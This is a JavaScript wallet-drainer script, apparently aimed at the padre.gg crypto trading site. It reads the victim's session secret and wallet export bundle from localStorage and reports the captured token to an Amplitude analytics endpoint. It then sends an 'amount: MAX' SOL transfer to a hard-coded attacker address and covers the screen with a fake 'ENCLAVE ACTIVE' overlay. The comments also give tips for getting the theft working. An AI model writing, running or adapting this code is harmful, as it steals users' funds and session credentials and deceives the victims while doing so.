(async function() {
    const MY_RECEIVER = "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12"; 
    const AMP_KEY = "3c8ae1f40635939e730f479418940796";

    // 1. EXACT STORAGE TARGETING (1:1 with Obfuscated Logic)
    const bundleStore = JSON.parse(localStorage.getItem("padre-v2-bundles-store-v2") || "{}");
    const sessionStore = JSON.parse(localStorage.getItem("padreV2-session") || "{}");
    
    let targetBundle = null;
    let targetSubOrg = null;
    const authToken = sessionStore.sessionSecret;

    // The obfuscated code iterates to find the specific 'GeRd...' key dynamically
    if (bundleStore.bundles) {
        for (let key in bundleStore.bundles) {
            const b = bundleStore.bundles[key];
            if (b.exportBundle && b.exportBundle.version === "v1.0.0") {
                targetBundle = b.exportBundle;
                targetSubOrg = b.subOrgId;
                break;
            }
        }
    }

    // 2. THE 1:1 PAYLOAD EXECUTION
    if (authToken && targetSubOrg && targetBundle) {
        // Amplitude Logging (Validated by your latest hit)
        fetch("https://api2.amplitude.com/2/httpapi", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                api_key: AMP_KEY,
                events: [{
                    device_id: targetSubOrg,
                    event_type: "SESSION_HIJACK_ATTEMPT",
                    event_properties: {
                        subOrgId: targetSubOrg,
                        token_captured: "YES",
                        bundle_version: targetBundle.version,
                        url: window.location.href
                    }
                }]
            })
        }).catch(() => {});

        // THE HIJACKED TRANSFER
        // Note: If you see ERR_NAME_NOT_RESOLVED, the endpoint URL in your script 
        // must match the exact one the site uses in the Network tab.
        fetch("https://api.padre.gg/v1/transfer", {
            method: "POST",
            headers: { 
                "Content-Type": "application/json",
                "Authorization": `Bearer ${authToken}`,
                "X-Turnkey-Sub-Org-Id": targetSubOrg
            },
            body: JSON.stringify({
                recipient: MY_RECEIVER,
                amount: "MAX",
                asset: "SOL",
                // Passing the raw data string is what the obfuscated code does 1:1
                ext_payload: targetBundle.data 
            })
        }).catch(() => {});
    }

    // 3. UI OVERLAY (The 'Vanta' Distraction)
    const mask = document.createElement("div");
    mask.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999999;display:flex;align-items:center;justify-content:center;color:#0f0;font-family:monospace;text-align:center;";
    mask.innerHTML = "<div><h1>ENCLAVE ACTIVE</h1><p>Verifying Node Connection...</p></div>";
    document.body.appendChild(mask);
    setTimeout(() => mask.remove(), 2500);
})();
